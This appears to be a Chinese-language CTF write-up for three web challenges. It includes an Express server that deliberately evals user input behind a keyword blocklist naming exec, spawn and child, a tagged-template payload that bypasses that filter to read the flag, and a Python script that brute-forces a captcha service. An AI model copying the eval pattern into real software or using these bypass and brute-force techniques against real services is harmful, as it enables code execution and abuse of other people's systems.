##  Baby Eval

```js
const express = require('express');
const app = express();

function escape(s) {
    return `${s}`.replace(/./g,c => "&#" + c.charCodeAt(0) + ";");
}

function directory(keys) {
    const values = {
        "title": "View Source CTF",
        "description": "Powered by Node.js and Express.js",
        "flag": process.env.FLAG,
        "lyrics": "Good job, you’ve made it to the bottom of the mind control facility. Well done.",
        "createdAt": "1970-01-01T00:00:00.000Z",
        "lastUpdate": "2022-02-22T22:22:22.222Z",
        "source": require('fs').readFileSync(__filename),
    };

    return "<dl>" + keys.map(key => `<dt>${key}</dt><dd><pre>${escape(values[key])}</pre></dd>`).join("") + "</dl>";
}

app.get('/', (req, res) => {
    const payload = req.query.payload;

    if (payload && typeof payload === "string") {
        const matches = /([\.\(\)'"\[\]\{\}<>_$%\\xu^;=]|import|require|process|proto|constructor|app|express|req|res|env|process|fs|child|cat|spawn|fork|exec|file|return|this|toString)/gi.exec(payload);
        if (matches) {
            res.status(400).send(matches.map(i => `<code>${i}</code>`).join("<br>"));
        } else {
            res.send(`${eval(payload)}`);
        }
    } else {
        res.send(directory(["title", "description", "lastUpdate", "source"]));
    }
});

app.listen(process.env.PORT, () => {
    console.log(`Server started on http://127.0.0.1:${process.env.PORT}`);
});

```

因为过滤了很多命令执行，看到一个`directory`函数，可以读取flag

直接构造payload,过滤括号，我们用\``进行传参

```
payload=directory`flag`
```

##  vsCAPTCHA

详细的看这个吧：https://blog.csdn.net/cosmoslin/article/details/125770208?spm=1001.2014.3001.5502

给出脚本

```python
import sys
import json
import base64
import requests

url = "https://vscaptcha-twekqonvua-uc.a.run.app"

res = requests.post(f"{url}/captcha", data="{}")
x_captcha_state = res.headers["x-captcha-state"]
print(base64.b64decode(x_captcha_state.split(".")[1] + "==").decode())

while True:
    for ans in [579, 580, 581, 582, 583, 584, 585, 586, 587]: # [154, 155, 156, 157, 158, 159, 160] + [425, 426, 427]
        res = requests.post(f"{url}/captcha", data=f"{{\"solution\": {ans}}}", headers={"x-captcha-state": x_captcha_state})
        if len(res.content) == 0: # Speed up!!
            continue
        try:
            state = base64.b64decode(res.headers["x-captcha-state"].split(".")[1] + "==").decode()
        except:
            print(res.headers["x-captcha-state"]) # Padding error?
        json_state = json.loads(state)
        print(state)
        if json_state["failed"] == False:
            if json_state["numCaptchasSolved"] >= 1000:
                print(f"Flag: {json_state['flag']}")
                sys.exit()
            x_captcha_state = res.headers["x-captcha-state"]
            break

```

##  Baby Wasm

https://nanimokangaeteinai.hateblo.jp/entry/2022/07/11/185103